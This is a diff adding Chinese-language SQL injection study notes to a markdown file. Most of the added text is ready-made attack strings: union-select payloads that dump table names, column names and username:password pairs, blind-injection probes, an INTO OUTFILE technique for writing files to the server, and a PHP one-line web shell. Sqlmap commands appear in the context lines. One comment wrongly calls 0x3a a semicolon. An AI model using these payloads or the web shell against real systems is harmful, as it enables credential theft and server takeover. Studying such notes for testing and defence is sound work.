@@ -158,3 +158,41 @@ print(result['country_name'])
 - 登录注入需要抓取提交的数据包，可以借用burpsuite抓取后复制保存至本地文件test.txt
 - sqlmap -r test.txt -p username --dbs
 - sqlmap -u "http://..." --dbs / -D 指定数据库 -T 指定表 -C 输出所有字段
+
+### 分类
+- 数字型：select * from table_name where id = 1;
+- 字符型: select * from table_name where id = '1';
+
+### GET错误注入
+1. 利用order by判断字段数
+2. 利用union select联合查询，获取表名
+```MySQL
+0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
+```
+3. 利用union select联合查询，获取字段名
+```mysql
+0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
+```
+4. 利用union select联合查询，获取字段值
+```mysql
+0' union select 1,group_concat(username, 0x3a, password),3 from users --+
+// 0x3a是分号;
+```
+### 盲注
+- 常分为基于布尔与时间的盲注
+- if(ascii(substr(database(),1,1)=115,1,sleep(3))) 当数据库名的第一个字母等于ASCII码115时，执行一次sleep函数等待3秒
+- select length(database());
+- select substr(database(),1,1);
+- select ascii(substr(database(),1,1));
+- select ascii(substr(database(),1,1))>N;
+- select ascii(substr(database(),1,1))=N;
+- select ascii(substr(database(),1,1))<N;
+
+### MySQL注入读写文件
+#### 前提
+- 用户权限足够高，最好为root
+- secure_file_priy不为NULL
+- union select 1,\<?php phpinfo();?>,3 into outfile '绝对路径'
+- 一句话木马：\<?php @eval($_POST['x']);?>
+#### sqlmap使用
+- sqlmap -hh查看详细的帮助信息
